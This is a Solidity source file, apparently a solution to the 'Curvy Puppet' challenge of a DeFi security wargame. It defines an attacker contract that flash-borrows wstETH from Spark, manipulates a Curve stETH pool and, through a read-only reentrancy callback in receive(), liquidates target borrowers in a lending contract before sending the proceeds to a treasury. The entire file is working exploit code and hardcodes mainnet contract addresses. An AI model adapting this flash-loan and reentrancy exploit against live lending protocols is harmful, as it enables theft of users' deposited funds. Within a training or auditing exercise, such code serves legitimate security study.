// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {CurvyPuppetLending} from "./CurvyPuppetLending.sol";
import {IStableSwap} from "./IStableSwap.sol";
import {WETH} from "solmate/tokens/WETH.sol";

interface IFlashLoanPool {
    function flashLoanSimple(
        address,
        address,
        uint256,
        bytes calldata,
        uint16
    ) external;
}

interface IWstETH {
    function unwrap(uint256) external returns (uint256);
    function wrap(uint256) external returns (uint256);
}

contract CurvyPuppetAttacker {
    IStableSwap constant curvePool =
        IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IPermit2 constant permit2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    // Spark Protocol — Aave V3 fork with 0% flash loan fee
    IFlashLoanPool constant spark =
        IFlashLoanPool(0xC13e21B648A5Ee794902342038FF3aDAB66BE987);
    WETH constant weth =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 constant stETH =
        IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    CurvyPuppetLending public immutable lending;
    IERC20 public immutable dvt;
    IERC20 public immutable lpToken;
    address public immutable treasury;
    address[] public targets;
    bool private _attacking;

    constructor(
        CurvyPuppetLending _lending,
        IERC20 _dvt,
        address _treasury,
        address[] memory _targets
    ) {
        lending = _lending;
        dvt = _dvt;
        lpToken = IERC20(curvePool.lp_token());
        treasury = _treasury;
        targets = _targets;
    }

    function attack() external {
        lpToken.approve(address(permit2), type(uint256).max);
        permit2.approve(
            address(lpToken),
            address(lending),
            type(uint160).max,
            type(uint48).max
        );

        spark.flashLoanSimple(address(this), WSTETH, 158_958 ether, "", 0);

        dvt.transfer(treasury, dvt.balanceOf(address(this)));
        lpToken.transfer(treasury, lpToken.balanceOf(address(this)));
        weth.transfer(treasury, weth.balanceOf(address(this)));
    }

    function executeOperation(
        address,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    ) external returns (bool) {
        IERC20(WSTETH).approve(WSTETH, amount);
        uint256 stETHAmount = IWstETH(WSTETH).unwrap(amount);

        stETH.approve(address(curvePool), stETHAmount);
        uint256 lpReceived = curvePool.add_liquidity(
            [uint256(0), stETHAmount],
            0
        );

        _attacking = true;
        curvePool.remove_liquidity(lpReceived, [uint256(0), uint256(0)]);
        _attacking = false;

        // Convert ETH + some WETH → stETH via Curve (favorable rate on imbalanced pool)
        // Need some WETH to cover round-trip slippage; keep 1 WETH for treasury
        uint256 wethBal = weth.balanceOf(address(this));
        if (wethBal > 191 ether) weth.withdraw(wethBal - 191 ether);
        curvePool.exchange{value: address(this).balance}(
            0,
            1,
            address(this).balance,
            0
        );

        // Wrap all stETH → wstETH and repay flash loan (0% premium)
        uint256 stETHBal = stETH.balanceOf(address(this));
        stETH.approve(WSTETH, stETHBal);
        IWstETH(WSTETH).wrap(stETHBal);
        IERC20(WSTETH).approve(address(spark), amount + premium);

        return true;
    }

    receive() external payable {
        if (!_attacking) return;
        for (uint256 i = 0; i < targets.length; i++) {
            lending.liquidate(targets[i]);
        }
    }
}
